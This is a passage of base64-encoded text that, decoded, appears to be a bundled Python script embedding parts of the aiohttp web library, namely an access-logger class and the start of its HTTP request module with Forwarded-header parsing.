0YXRpY21ldGhvZFxyXG4gICAgZGVmIF9mb3JtYXRfYihyZXF1ZXN0OiBCYXNlUmVxdWVzdCwgcmVzcG9uc2U6IFN0cmVhbVJlc3BvbnNlLCB0aW1lOiBmbG9hdCkgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiByZXNwb25zZS5ib2R5X2xlbmd0aFxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfZm9ybWF0X1QocmVxdWVzdDogQmFzZVJlcXVlc3QsIHJlc3BvbnNlOiBTdHJlYW1SZXNwb25zZSwgdGltZTogZmxvYXQpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gc3RyKHJvdW5kKHRpbWUpKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfZm9ybWF0X1RmKHJlcXVlc3Q6IEJhc2VSZXF1ZXN0LCByZXNwb25zZTogU3RyZWFtUmVzcG9uc2UsIHRpbWU6IGZsb2F0KSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICIlMDZmIiAlIHRpbWVcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgX2Zvcm1hdF9EKHJlcXVlc3Q6IEJhc2VSZXF1ZXN0LCByZXNwb25zZTogU3RyZWFtUmVzcG9uc2UsIHRpbWU6IGZsb2F0KSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIHN0cihyb3VuZCh0aW1lICogMTAwMDAwMCkpXHJcblxyXG4gICAgZGVmIF9mb3JtYXRfbGluZShcclxuICAgICAgICBzZWxmLCByZXF1ZXN0OiBCYXNlUmVxdWVzdCwgcmVzcG9uc2U6IFN0cmVhbVJlc3BvbnNlLCB0aW1lOiBmbG9hdFxyXG4gICAgKSAtPiBJdGVyYWJsZVtUdXBsZVtzdHIsIENhbGxhYmxlW1tCYXNlUmVxdWVzdCwgU3RyZWFtUmVzcG9uc2UsIGZsb2F0XSwgc3RyXV1dOlxyXG4gICAgICAgIHJldHVybiBbKGtleSwgbWV0aG9kKHJlcXVlc3QsIHJlc3BvbnNlLCB0aW1lKSkgZm9yIGtleSwgbWV0aG9kIGluIHNlbGYuX21ldGhvZHNdXHJcblxyXG4gICAgZGVmIGxvZyhzZWxmLCByZXF1ZXN0OiBCYXNlUmVxdWVzdCwgcmVzcG9uc2U6IFN0cmVhbVJlc3BvbnNlLCB0aW1lOiBmbG9hdCkgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGZtdF9pbmZvID0gc2VsZi5fZm9ybWF0X2xpbmUocmVxdWVzdCwgcmVzcG9uc2UsIHRpbWUpXHJcblxyXG4gICAgICAgICAgICB2YWx1ZXMgPSBsaXN0KClcclxuICAgICAgICAgICAgZXh0cmEgPSBkaWN0KClcclxuICAgICAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gZm10X2luZm86XHJcbiAgICAgICAgICAgICAgICB2YWx1ZXMuYXBwZW5kKHZhbHVlKVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIGtleS5fX2NsYXNzX18gaXMgc3RyOlxyXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhW2tleV0gPSB2YWx1ZVxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICBrMSwgazIgPSBrZXkgICMgdHlwZTogaWdub3JlW21pc2NdXHJcbiAgICAgICAgICAgICAgICAgICAgZGN0ID0gZXh0cmEuZ2V0KGsxLCB7fSkgICMgdHlwZTogaWdub3JlW3Zhci1hbm5vdGF0ZWQsaGFzLXR5cGVdXHJcbiAgICAgICAgICAgICAgICAgICAgZGN0W2syXSA9IHZhbHVlICAjIHR5cGU6IGlnbm9yZVtpbmRleCxoYXMtdHlwZV1cclxuICAgICAgICAgICAgICAgICAgICBleHRyYVtrMV0gPSBkY3QgICMgdHlwZTogaWdub3JlW2hhcy10eXBlLGFzc2lnbm1lbnRdXHJcblxyXG4gICAgICAgICAgICBzZWxmLmxvZ2dlci5pbmZvKHNlbGYuX2xvZ19mb3JtYXQgJSB0dXBsZSh2YWx1ZXMpLCBleHRyYT1leHRyYSlcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uOlxyXG4gICAgICAgICAgICBzZWxmLmxvZ2dlci5leGNlcHRpb24oIkVycm9yIGluIGxvZ2dpbmciKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC93ZWJfcmVxdWVzdC5weScsIGInaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IGRhdGV0aW1lXHJcbmltcG9ydCBpb1xyXG5pbXBvcnQgcmVcclxuaW1wb3J0IHNvY2tldFxyXG5pbXBvcnQgc3RyaW5nXHJcbmltcG9ydCB0ZW1wZmlsZVxyXG5pbXBvcnQgdHlwZXNcclxuaW1wb3J0IHdhcm5pbmdzXHJcbmZyb20gaHR0cC5jb29raWVzIGltcG9ydCBTaW1wbGVDb29raWVcclxuZnJvbSB0eXBlcyBpbXBvcnQgTWFwcGluZ1Byb3h5VHlwZVxyXG5mcm9tIHR5cGluZyBpbXBvcnQgKFxyXG4gICAgVFlQRV9DSEVDS0lORyxcclxuICAgIEFueSxcclxuICAgIERpY3QsXHJcbiAgICBJdGVyYXRvcixcclxuICAgIE1hcHBpbmcsXHJcbiAgICBNdXRhYmxlTWFwcGluZyxcclxuICAgIE9wdGlvbmFsLFxyXG4gICAgUGF0dGVybixcclxuICAgIFR1cGxlLFxyXG4gICAgVW5pb24sXHJcbiAgICBjYXN0LFxyXG4pXHJcbmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBwYXJzZV9xc2xcclxuXHJcbmltcG9ydCBhdHRyXHJcbmZyb20gbXVsdGlkaWN0IGltcG9ydCBDSU11bHRpRGljdCwgQ0lNdWx0aURpY3RQcm94eSwgTXVsdGlEaWN0LCBNdWx0aURpY3RQcm94eVxyXG5mcm9tIHlhcmwgaW1wb3J0IFVSTFxyXG5cclxuZnJvbSAuIGltcG9ydCBoZHJzXHJcbmZyb20gLmFiYyBpbXBvcnQgQWJzdHJhY3RTdHJlYW1Xcml0ZXJcclxuZnJvbSAuaGVscGVycyBpbXBvcnQgKFxyXG4gICAgREVCVUcsXHJcbiAgICBFVEFHX0FOWSxcclxuICAgIExJU1RfUVVPVEVEX0VUQUdfUkUsXHJcbiAgICBDaGFpbk1hcFByb3h5LFxyXG4gICAgRVRhZyxcclxuICAgIEhlYWRlcnNNaXhpbixcclxuICAgIHBhcnNlX2h0dHBfZGF0ZSxcclxuICAgIHJlaWZ5LFxyXG4gICAgc2VudGluZWwsXHJcbilcclxuZnJvbSAuaHR0cF9wYXJzZXIgaW1wb3J0IFJhd1JlcXVlc3RNZXNzYWdlXHJcbmZyb20gLmh0dHBfd3JpdGVyIGltcG9ydCBIdHRwVmVyc2lvblxyXG5mcm9tIC5tdWx0aXBhcnQgaW1wb3J0IEJvZHlQYXJ0UmVhZGVyLCBNdWx0aXBhcnRSZWFkZXJcclxuZnJvbSAuc3RyZWFtcyBpbXBvcnQgRW1wdHlTdHJlYW1SZWFkZXIsIFN0cmVhbVJlYWRlclxyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgKFxyXG4gICAgREVGQVVMVF9KU09OX0RFQ09ERVIsXHJcbiAgICBGaW5hbCxcclxuICAgIEpTT05EZWNvZGVyLFxyXG4gICAgTG9vc2VIZWFkZXJzLFxyXG4gICAgUmF3SGVhZGVycyxcclxuICAgIFN0ck9yVVJMLFxyXG4pXHJcbmZyb20gLndlYl9leGNlcHRpb25zIGltcG9ydCBIVFRQUmVxdWVzdEVudGl0eVRvb0xhcmdlXHJcbmZyb20gLndlYl9yZXNwb25zZSBpbXBvcnQgU3RyZWFtUmVzcG9uc2VcclxuXHJcbl9fYWxsX18gPSAoIkJhc2VSZXF1ZXN0IiwgIkZpbGVGaWVsZCIsICJSZXF1ZXN0IilcclxuXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBmcm9tIC53ZWJfYXBwIGltcG9ydCBBcHBsaWNhdGlvblxyXG4gICAgZnJvbSAud2ViX3Byb3RvY29sIGltcG9ydCBSZXF1ZXN0SGFuZGxlclxyXG4gICAgZnJvbSAud2ViX3VybGRpc3BhdGNoZXIgaW1wb3J0IFVybE1hcHBpbmdNYXRjaEluZm9cclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgRmlsZUZpZWxkOlxyXG4gICAgbmFtZTogc3RyXHJcbiAgICBmaWxlbmFtZTogc3RyXHJcbiAgICBmaWxlOiBpby5CdWZmZXJlZFJlYWRlclxyXG4gICAgY29udGVudF90eXBlOiBzdHJcclxuICAgIGhlYWRlcnM6ICJDSU11bHRpRGljdFByb3h5W3N0cl0iXHJcblxyXG5cclxuX1RDSEFSOiBGaW5hbFtzdHJdID0gc3RyaW5nLmRpZ2l0cyArIHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgciIhIyQlJlwnKisuXl9gfH4tIlxyXG4jIFwnLVwnIGF0IHRoZSBlbmQgdG8gcHJldmVudCBpbnRlcnByZXRhdGlvbiBhcyByYW5nZSBpbiBhIGNoYXIgY2xhc3NcclxuXHJcbl9UT0tFTjogRmluYWxbc3RyXSA9IGZyIlt7X1RDSEFSfV0rIlxyXG5cclxuX1FEVEVYVDogRmluYWxbc3RyXSA9IHIiW3t9XSIuZm9ybWF0KFxyXG4gICAgciIiLmpvaW4oY2hyKGMpIGZvciBjIGluICgweDA5LCAweDIwLCAweDIxKSArIHR1cGxlKHJhbmdlKDB4MjMsIDB4N0YpKSlcclxuKVxyXG4jIHFkdGV4dCBpbmNsdWRlcyAweDVDIHRvIGVzY2FwZSAweDVEIChcJ1xcXVwnKVxyXG4jIHFkdGV4dCBleGNsdWRlcyBvYnMtdGV4dCAoYmVjYXVzZSBvYnNvbGV0ZWQsIGFuZCBlbmNvZGluZyBub3Qgc3BlY2lmaWVkKVxyXG5cclxuX1FVT1RFRF9QQUlSOiBGaW5hbFtzdHJdID0gciJcXFxcW1xcdCAhLX5dIlxyXG5cclxuX1FVT1RFRF9TVFJJTkc6IEZpbmFsW3N0cl0gPSByXCciKD86e3F1b3RlZF9wYWlyfXx7cWR0ZXh0fSkqIlwnLmZvcm1hdChcclxuICAgIHFkdGV4dD1fUURURVhULCBxdW90ZWRfcGFpcj1fUVVPVEVEX1BBSVJcclxuKVxyXG5cclxuX0ZPUldBUkRFRF9QQUlSOiBGaW5hbFtcclxuICAgIHN0clxyXG5dID0gciIoe3Rva2VufSk9KHt0b2tlbn18e3F1b3RlZF9zdHJpbmd9KSg6XFxke3sxLDR9fSk/Ii5mb3JtYXQoXHJcbiAgICB0b2tlbj1fVE9LRU4sIHF1b3RlZF9zdHJpbmc9X1FVT1RFRF9TVFJJTkdcclxuKVxyXG5cclxuX1FVT1RFRF9QQUlSX1JFUExBQ0VfUkU6IEZpbmFsW1BhdHRlcm5bc3RyXV0gPSByZS5jb21waWxlKHIiXFxcXChbXFx0ICEtfl0pIilcclxuIyBzYW1lIHBhdHRlcm4gYXMgX1FVT1RFRF9QQUlSIGJ1dCBjb250YWlucyBhIGNhcHR1cmUgZ3JvdXBcclxuXHJcbl9GT1JXQVJERURfUEFJUl9SRTogRmluYWxbUGF0dGVybltzdHJdXSA9IHJlLmNvbXBpbGUoX0ZPUldBUkRFRF9QQUlSKVxyXG5cclxuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXHJcbiMgSFRUUCBSZXF1ZXN0XHJcbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xyXG5cclxuXHJcbmNsYXNzIEJhc2VSZXF1ZXN0KE11dGFibGVNYXBwaW5nW3N0ciwgQW55XSwgSGVhZGVyc01peGluKTpcclxuXHJcbiAgICBQT1NUX01FVEhPRFMgPSB7XHJcbiAgICAgICAgaGRycy5NRVRIX1BBVENILFxyXG4gICAgICAgIGhkcnMuTUVUSF9QT1NULFxyXG4gICAgICAgIGhkcnMuTUVUSF9QVVQsXHJcbiAgICAgICAgaGRycy5NRVRIX1RSQUNFLFxyXG4gICAgICAgIGhkcnMuTUVUSF9ERUxFVEUsXHJcbiAgICB9XHJcblxyXG4gICAgQVRUUlMgPSBIZWFkZXJzTWl4aW4uQVRUUlMgfCBmcm96ZW5zZXQoXHJcbiAgICAgICAgW1xyXG4gICAgICAgICAgICAiX21lc3NhZ2UiLFxyXG4gICAgICAgICAgICAiX3Byb3RvY29sIixcclxuICAgICAgICAgICAgIl9wYXlsb2FkX3dyaXRlciIsXHJcbiAgICAgICAgICAgICJfcGF5bG9hZCIsXHJcbiAgICAgICAgICAgICJfaGVhZGVycyIsXHJcbiAgICAgICAgICAgICJfbWV0aG9kIixcclxuICAgICAgICAgICAgIl92ZXJzaW9uIixcclxuICAgICAgICAgICAgIl9yZWxfdXJsIixcclxuICAgICAgICAgICAgIl9wb3N0IixcclxuICAgICAgICAgICAgIl9yZWFkX2J5dGVzIixcclxuICAgICAgICAgICAgIl9zdGF0ZSIsXHJcbiAgICAgICAgICAgICJfY2FjaGUiLFxyXG4gICAgICAgICAgICAiX3Rhc2siLFxyXG4gICAgICAgICAgICAiX2NsaWVudF9tYXhfc2l6ZSIsXHJcbiAgICAgICAgICAgICJfbG9vcCIsXHJcbiAgICAgICAgICAgICJfdHJhbnNwb3J0X3NzbGNvbnRleHQiLFxyXG4gICAgICAgICAgICAiX3RyYW5zcG9ydF9wZWVybmFtZSIsXHJcbiAgICAgICAgXVxyXG4gICAgKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG1lc3NhZ2U6IFJhd1JlcXVlc3RNZXNzYWdlLFxyXG4gICAgICAgIHBheWxvYWQ6IFN0cmVhbVJlYWRlcixcclxuICAgICAgICBwcm90b2NvbDogIlJlcXVlc3RIYW5kbGVyIixcclxuICAgICAgICBwYXlsb2FkX3dyaXRlcjogQWJzdHJhY3RTdHJlYW1Xcml0ZXIsXHJcbiAgICAgICAgdGFzazogImFzeW5jaW8uVGFza1tOb25lXSIsXHJcbiAgICAgICAgbG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcCxcclxuICAgICAgICAqLFxyXG4gICAgICAgIGNsaWVudF9tYXhfc2l6ZTogaW50ID0gMTAyNCAqKiAyLFxyXG4gICAgICAgIHN0YXRlOiBPcHRpb25hbFtEaWN0W3N0ciwgQW55XV0gPSBOb25lLFxyXG4gICAgICAgIHNjaGVtZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgaG9zdDogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgcmVtb3RlOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiBzdGF0ZSBpcyBOb25lOlxyXG4gICAgICAgICAgICBzdGF0ZSA9IHt9XHJcbiAgICAgICAgc2VsZi5fbWVzc2FnZSA9IG1lc3NhZ2VcclxuICAgICAgICBzZWxmLl9wcm90b2NvbCA9IHByb3RvY29sXHJcbiAgICAgICAgc2VsZi5fcGF5bG9hZF93cml0ZXIgPSBwYXlsb2FkX3dyaXRlclxyXG5cclxuICAgICAgICBzZWxmLl9wYXlsb2FkID0gcGF5bG9hZFxyXG4gICAgICAgIHNlbGYuX2hlYWRlcnMgPSBtZXNzYWdlLmhlYWRlcnNcclxuICAgICAgICBzZWxmLl9tZXRob2QgPSBtZXNzYWdlLm1ldGhvZFxyXG4gICAgICAgIHNlbGYuX3ZlcnNpb24gPSBtZXNzYWdlLnZlcnNpb25cclxuICAgICAgICBzZWxmLl9yZWxfdXJsID0gbWVzc2FnZS51cmxcclxuICAgICAgICBzZWxmLl9wb3N0ID0gKFxyXG4gICAgICAgICAgICBOb25lXHJcbiAgICAgICAgKSAgIyB0eXBlOiBPcHRpb25hbFtNdWx0aURpY3RQcm94eVtVbmlvbltzdHIsIGJ5dGVzLCBGaWxlRmllbGRdXV1cclxuICAgICAgICBzZWxmLl9yZWFkX2J5dGVzID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtieXRlc11cclxuXHJcbiAgICAgICAgc2VsZi5fc3RhdGUgPSBzdGF0ZVxyXG4gICAgICAgIHNlbGYuX2NhY2hlID0ge30gICMgdHlwZTogRGljdFtzdHIsIEFueV1cclxuICAgICAgICBzZWxmLl90YXNrID0gdGFza1xyXG4gICAgICAgIHNlbGYuX2NsaWVudF9tYXhfc2l6ZSA9IGNsaWVudF9tYXhfc2l6ZVxyXG4gICAgICAgIHNlbGYuX2xvb3AgPSBsb29wXHJcblxyXG4gICAgICAgIHRyYW5zcG9ydCA9IHNlbGYuX3Byb3RvY29sLnRyYW5zcG9ydFxyXG4gICAgICAgIGFzc2VydCB0cmFuc3BvcnQgaXMgbm90IE5vbmVcclxuICAgICAgICBzZWxmLl90cmFuc3BvcnRfc3NsY29udGV4dCA9IHRyYW5zcG9ydC5nZXRfZXh0cmFfaW5mbygic3NsY29udGV4dCIpXHJcbiAgICAgICAgc2VsZi5fdHJhbnNwb3J0X3BlZXJuYW1lID0gdHJhbnNwb3J0LmdldF9leHRyYV9pbmZvKCJwZWVybmFtZSIpXHJcblxyXG4gICAgICAgIGlmIHNjaGVtZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fY2FjaGVbInNjaGVtZSJdID0gc2NoZW1lXHJcbiAgICAgICAgaWYgaG9zdCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fY2FjaGVbImhvc3QiXSA9IGhvc3RcclxuICAgICAgICBpZiByZW1vdGUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2NhY2hlWyJyZW1vdGUiXSA9IHJlbW90ZVxyXG5cclxuICAgIGRlZiBjbG9uZShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgbWV0aG9kOiBzdHIgPSBzZW50aW5lbCxcclxuICAgICAgICByZWxfdXJsOiBTdHJPclVSTCA9IHNlbnRpbmVsLFxyXG4gICAgICAgIGhlYWRlcnM6IExvb3NlSGVhZGVycyA9IHNlbnRpbmVsLFxyXG4gICAgICAgIHNjaGVtZTogc3RyID0gc2VudGluZWwsXHJcbiAgICAgICAgaG9zdDogc3RyID0gc2VudGluZWwsXHJcbiAgICAgICAgcmVtb3RlOiBzdHIgPSBzZW50aW5lbCxcclxuICAgICkgLT4gIkJhc2VSZXF1ZXN0IjpcclxuICAgICAgICAiIiJDbG9uZSBpdHNlbGYgd2l0aCByZXBsYWNlbWVudCBzb21lIGF0dHJpYnV0ZXMuXHJcblxyXG4gICAgICAgIENyZWF0ZXMgYW5kIHJldHVybnMgYSBuZXcgaW5zdGFuY2Ugb2YgUmVxdWVzdCBvYmplY3QuIElmIG5vIHBhcmFtZXRlcnNcclxuICAgICAgICBhcmUgZ2l2ZW4sIGFuIGV4YWN0IGNvcHkgaXMgcmV0dXJuZWQuIElmIGEgcGFyYW1ldGVyIGlzIG5vdCBwYXNzZWQsIGl0XHJcbiAgICAgICAgd2lsbCByZXVzZSB0aGUgb25lIGZyb20gdGhlIGN1cnJlbnQgcmVxdWVzdCBvYmplY3QuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fcmVhZF9ieXRlczpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDYW5ub3QgY2xvbmUgcmVxdWVzdCAiICJhZnRlciByZWFkaW5nIGl0cyBjb250ZW50IilcclxuXHJcbiAgICAgICAgZGN0ID0ge30gICMgdHlwZTogRGljdFtzdHIsIEFueV1cclxuICAgICAgICBpZiBtZXRob2QgaXMgbm90IHNlbnRpbmVsOlxyXG4gICAgICAgICAgICBkY3RbIm1ldGhvZCJdID0gbWV0aG9kXHJcbiAgICAgICAgaWYgcmVsX3VybCBpcyBub3Qgc2VudGluZWw6XHJcbiAgICAgICAgICAgIG5ld191cmwgPSBVUkwocmVsX3VybClcclxuICAgICAgICAgICAgZGN0WyJ1cmwiXSA9IG5ld191cmxcclxuICAgICAgICAgICAgZGN0WyJwYXRoIl0gPSBzdHIobmV3X3VybClcclxuICAgICAgICBpZiBoZWFkZXJzIGlzIG5vdCBzZW50aW5lbDpcclxuICAgICAgICAgICAgIyBhIGNvcHkgc2VtYW50aWNcclxuICAgICAgICAgICAgZGN0WyJoZWFkZXJzIl0gPSBDSU11bHRpRGljdFByb3h5KENJTXVsdGlEaWN0KGhlYWRlcnMpKVxyXG4gICAgICAgICAgICBkY3RbInJhd19oZWFkZXJzIl0gPSB0dXBsZShcclxuICAgICAgICAgICAgICAgIChrLmVuY29kZSgidXRmLTgiKSwgdi5lbmNvZGUoInV0Zi04IikpIGZvciBrLCB2IGluIGhlYWRlcnMuaXRlbXMoKVxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIG1lc3NhZ2UgPSBzZWxmLl9tZXNzYWdlLl9yZXBsYWNlKCoqZGN0KVxyXG5cclxuICAgICAgICBrd2FyZ3MgPSB7fVxyXG4gICAgICAgIGlmIHNjaGVtZSBpcyBub3Qgc2VudGluZWw6XHJcbiAgICAgICAgICAgIGt3YXJnc1sic2NoZW1lIl0gPSBzY2hlbWVcclxuICAgICAgICBpZiBob3N0IGlzIG5vdCBzZW50aW5lbDpcclxuICAgICAgICAgICAga3dhcmdzWyJob3N0Il0gPSBob3N0XHJcbiAgICAgICAgaWYgcmVtb3RlIGlzIG5vdCBzZW50aW5lbDpcclxuICAgICAgICAgICAga3dhcmdzWyJyZW1vdGUiXSA9IHJlbW90ZVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fX2NsYXNzX18oXHJcbiAgICAgICAgICAgIG1lc3NhZ2UsXHJcbiAgICAgICAgICAgIHNlbGYuX3BheWxvYWQsXHJcbiAgICAgICAgICAgIHNlbGYuX3Byb3RvY29sLFxyXG4gICAgICAgICAgICBzZWxmLl9wYXlsb2FkX3dyaXRlcixcclxuICAgICAgICAgICAgc2VsZi5fdGFzayxcclxuICAgICAgICAgICAgc2VsZi5fbG9vcCxcclxuICAgICAgICAgICAgY2xpZW50X21heF9zaXplPXNlbGYuX2NsaWVudF9tYXhfc2l6ZSxcclxuICAgICAgICAgICAgc3RhdGU9c2VsZi5fc3RhdGUuY29weSgpLFxyXG4gICAgICAgICAgICAqKmt3YXJncyxcclxuICAgICAgICApXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdGFzayhzZWxmKSAtPiAiYXN5bmNpby5UYXNrW05vbmVdIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fdGFza1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHByb3RvY29sKHNlbGYpIC0+ICJSZXF1ZXN0SGFuZGxlciI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3Byb3RvY29sXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdHJhbnNwb3J0KHNlbGYpIC0+IE9wdGlvbmFsW2FzeW5jaW8uVHJhbnNwb3J0XTpcclxuICAgICAgICBpZiBzZWxmLl9wcm90b2NvbCBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wcm90b2NvbC50cmFuc3BvcnRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB3cml0ZXIoc2VsZikgLT4gQWJzdHJhY3RTdHJlYW1Xcml0ZXI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3BheWxvYWRfd3JpdGVyXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgbWVzc2FnZShzZWxmKSAtPiBSYXdSZXF1ZXN0TWVzc2FnZTpcclxuICAgICAgICB3YXJuaW5ncy53YXJuKCJSZXF1ZXN0Lm1lc3NhZ2UgaXMgZGVwcmVjYXRlZCIsIERlcHJlY2F0aW9uV2FybmluZywgc3RhY2tsZXZlbD0zKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9tZXNzYWdlXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgcmVsX3VybChzZWxmKSAtPiBVUkw6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlbF91cmxcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBsb29wKHNlbGYpIC0+IGFzeW5jaW8uQWJzdHJhY3RFdmVudExvb3A6XHJcbiAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgInJlcXVlc3QubG9vcCBwcm9wZXJ0eSBpcyBkZXByZWNhdGVkIiwgRGVwcmVjYXRpb25XYXJuaW5nLCBzdGFja2xldmVsPTJcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2xvb3BcclxuXHJcbiAgICAjIE11dGFibGVNYXBwaW5nIEFQSVxyXG5cclxuICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBrZXk6IHN0cikgLT4gQW55OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9zdGF0ZVtrZXldXHJcblxyXG4gICAgZGVmIF9fc2V0aXRlbV9fKHNlbGYsIGtleTogc3RyLCB2YWx1ZTogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX3N0YXRlW2tleV0gPSB2YWx1ZVxyXG5cclxuICAgIGRlZiBfX2RlbGl0ZW1fXyhzZWxmLCBrZXk6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBkZWwgc2VsZi5fc3RhdGVba2V5XVxyXG5cclxuICAgIGRlZiBfX2xlbl9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gbGVuKHNlbGYuX3N0YXRlKVxyXG5cclxuICAgIGRlZiBfX2l0ZXJfXyhzZWxmKSAtPiBJdGVyYXRvcltzdHJdOlxyXG4gICAgICAgIHJldHVybiBpdGVyKHNlbGYuX3N0YXRlKVxyXG5cclxuICAgICMjIyMjIyMjXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgc2VjdXJlKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiQSBib29sIGluZGljYXRpbmcgaWYgdGhlIHJlcXVlc3QgaXMgaGFuZGxlZCB3aXRoIFNTTC4iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5zY2hlbWUgPT0gImh0dHBzIlxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIGZvcndhcmRlZChzZWxmKSAtPiBUdXBsZVtNYXBwaW5nW3N0ciwgc3RyXSwgLi4uXTpcclxuICAgICAgICAiIiJBIHR1cGxlIGNvbnRhaW5pbmcgYWxsIHBhcnNlZCBGb3J3YXJkZWQgaGVhZGVyKHMpLlxyXG5cclxuICAgICAgICBNYWtlcyBhbiBlZmZvcnQgdG8gcGFyc2UgRm9yd2FyZGVkIGhlYWRlcnMgYXMgc3BlY2lmaWVkIGJ5IFJGQyA3MjM5OlxyXG5cclxuICAgICAgICAtIEl0IGFkZHMgb25lIChpbW11dGFibGUpIGRpY3Rpb25hcnkgcGVyIEZvcndhcmRlZCBcJ2ZpZWxkLXZhbHVlXCcsIGllXHJcbiAgICAgICAgICBwZXIgcHJveHkuIFRoZSBlbGVtZW50IGNvcnJlc3BvbmRzIHRvIHRoZSBkYXRhIGluIHRoZSBGb3J3YXJkZWRcclxuICAgICAgICAgIGZpZWxkLXZhbHVlIGFkZGVkIGJ5IHRoZSBmaXJzdCBwcm94eSBlbmNvdW50ZXJlZCBieSB0aGUgY2xpZW50LiBFYWNoXHJcbiAgICAgICAgICBzdWJzZXF1ZW50IGl0ZW0gY29ycmVzcG9uZHMgdG8gdGhvc2UgYWRkZWQgYnkgbGF0ZXIgcHJveGllcy5cclxuICAgICAgICAtIEl0IGNoZWNrcyB0aGF0IGV2ZXJ5IHZhbHVlIGhhcyB2YWxpZCBzeW50YXggaW4gZ2VuZXJhbCBhcyBzcGVjaWZpZWRcclxuICAgICAgICAgIGluIHNlY3Rpb24gNDogZWl0aGVyIGEgXCd0b2tlblwnIG9yIGEgXCdxdW90ZWQtc3RyaW5nXCcuXHJcbiAgICAgICAgLSBJdCB1bi1lc2NhcGVzIGZvdW5kIGVzY2FwZSBzZXF1ZW5jZXMuXHJcbiAgICAgICAgLSBJdCBkb2VzIE5PVCB2YWxpZGF0ZSBcJ2J5XCcgYW5kIFwnZm9yXCcgY29udGVudHMgYXMgc3BlY2lmaWVkIGluIHNlY3Rpb25cclxuICAgICAgICAgIDYuXHJcbiAgICAgICAgLSBJdCBkb2VzIE5PVCB2YWxpZGF0ZSBcJ2hvc3RcJyBjb250ZW50cyAoSG9zdCBBQk5GKS5cclxuICAgICAgICAtIEl0IGRvZXMgTk9UIHZhbGlkYXRlIFwncHJvdG9cJyBjb250ZW50cyBmb3IgdmFsaWQgVVJJIHNjaGVtZSBuYW1lcy5cclxuXHJcbiAgICAgICAgUmV0dXJucyBhIHR1cGxlIGNvbnRhaW5pbmcgb25lIG9yIG1vcmUgaW1tdXRhYmxlIGRpY3RzXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgZWxlbXMgPSBbXVxyXG4gICAgICAgIGZvciBmaWVsZF92YWx1ZSB